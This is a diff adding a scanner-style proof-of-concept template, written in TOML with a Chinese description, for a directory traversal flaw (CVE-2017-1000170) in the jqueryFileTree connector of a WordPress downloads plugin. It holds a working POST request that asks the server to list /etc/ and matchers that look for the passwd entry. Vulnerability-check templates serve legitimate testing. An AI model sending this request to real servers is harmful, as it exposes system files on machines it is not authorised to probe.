@@ -1,0 +1,38 @@
+[info]
+author = "AVE"
+description = "通过 POST 请求向 jqueryFileTree.php 发送 dir=/etc/ 参数，检测服务器是否返回 /etc/passwd 文件列表，验证目录遍历漏洞是否存在"
+id = "POC-AVE-2017-0017"
+name = "jqueryFileTree 目录遍历漏洞 PoC"
+severity = "high"
+tags = ["ave-2017-0017"]
+vuln_id = [
+    "CVE-2017-1000170",
+    "AVE-2017-0017",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/wp-content/plugins/delightful-downloads/assets/vendor/jqueryFileTree/connectors/jqueryFileTree.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "dir=%2Fetc%2F&onlyFiles=true"
+type = "raw"
+
+[[poc.requests.matchers]]
+condition = "and"
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<li class='file ext_passwd'>",
+    "<a rel='/passwd'>passwd</a></li>",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
